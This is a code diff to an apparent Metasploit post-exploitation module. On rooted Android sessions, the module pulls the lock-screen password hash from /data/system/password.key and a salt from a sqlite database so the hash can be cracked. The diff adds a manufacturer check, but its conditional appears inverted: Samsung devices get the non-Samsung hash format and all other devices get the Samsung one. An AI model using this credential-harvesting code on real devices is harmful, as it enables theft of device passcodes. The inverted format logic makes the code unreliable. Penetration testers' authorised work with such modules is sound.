@@ -5,7 +5,6 @@
 
 require 'sqlite3'
 require 'fileutils'
-require 'metasploit/framework/hashes/identify'
 
 class MetasploitModule < Msf::Post
 
@@ -20,12 +19,10 @@ class MetasploitModule < Msf::Post
            To perform this operation, two things are needed.  First, a password.key file
            is required as this contains the hash but no salt.  Next, a sqlite3 database
            is needed (with supporting files) to pull the salt from.  Combined, this
-           creates the hash we need.  This can be cracked with Hashcat, mode 5800.
-           Samsung devices only have SHA1 hashes, while most other Android devices
-           also have an MD5 hash.
+           creates the hash we need.  Samsung based devices change the hash slightly.
         },
         'License'       => MSF_LICENSE,
-        'Author'        => ['h00die'],
+        'Author'        => ['h00die', 'timwr'],
         'SessionTypes'  => [ 'meterpreter', 'shell' ],
         'Platform'      => 'android',
         'References'    => [
@@ -75,6 +72,8 @@ class MetasploitModule < Msf::Post
     unless is_root?
       fail_with Failure::NoAccess, 'This module requires root permissions.'
     end
+
+    manu = cmd_exec("getprop ro.build.manufacturer")
 
     print_status('Attempting to determine unsalted hash.')
     key_file = '/data/system/password.key'
@@ -127,9 +126,9 @@ class MetasploitModule < Msf::Post
     sha1 = hash[0...40]
     sha1 = "#{sha1}:#{salt}"
     print_good("SHA1: #{sha1}")
-    #print_good("Crack with: hashcat -m 5800 #{sha1}")
     credential_data = {
-        jtr_format: identify_hash(sha1),
+        # no way to tell them apart w/o knowing one is samsung or not.
+        jtr_format: manu =~ /samsung/i ? 'android-sha1' : 'android-samsung-sha1' ,
         origin_type: :session,
         post_reference_name: self.refname,
         private_type: :nonreplayable_hash,
